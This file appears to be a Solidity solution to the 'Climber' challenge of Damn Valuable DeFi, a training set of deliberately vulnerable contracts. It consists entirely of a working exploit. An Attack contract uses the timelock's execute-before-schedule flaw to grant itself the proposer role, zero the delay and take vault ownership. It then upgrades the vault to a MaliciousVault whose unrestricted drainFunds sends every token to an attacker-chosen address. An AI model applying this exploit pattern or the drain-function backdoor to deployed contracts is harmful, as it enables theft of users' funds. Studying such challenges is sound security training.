// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

import {IERC20} from "@openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

//import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

import {ClimberTimelockBase} from "../src/ClimberTimelockBase.sol";
import {ClimberTimelock} from "../src/ClimberTimelock.sol";
import {ClimberVault} from "../src/ClimberVault.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

contract Attack {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    address recovery;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        DamnValuableToken _token,
        address _recovery
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        address maliciousImpl = address(new MaliciousVault());

        bytes memory grantRoleData = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        bytes memory changeDelayData = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        bytes memory transferOwnershipData = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        bytes memory scheduleData = abi.encodeWithSignature(
            "timelockSchedule()"
        );

        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = grantRoleData;

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = changeDelayData;

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = transferOwnershipData;

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = scheduleData;

        timelock.execute(targets, values, dataElements, bytes32(0));

        vault.upgradeToAndCall(address(maliciousImpl), "");
        MaliciousVault(address(vault)).drainFunds(address(token), recovery);
    }

    function timelockSchedule() external {
        timelock.schedule(targets, values, dataElements, bytes32(0));
    }
}

contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function drainFunds(address tokenAddress, address receiver) external {
        ERC20 token = ERC20(tokenAddress); // Explicitly cast to IERC20
        SafeTransferLib.safeTransfer(
            token,
            receiver,
            token.balanceOf(address(this))
        );
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}
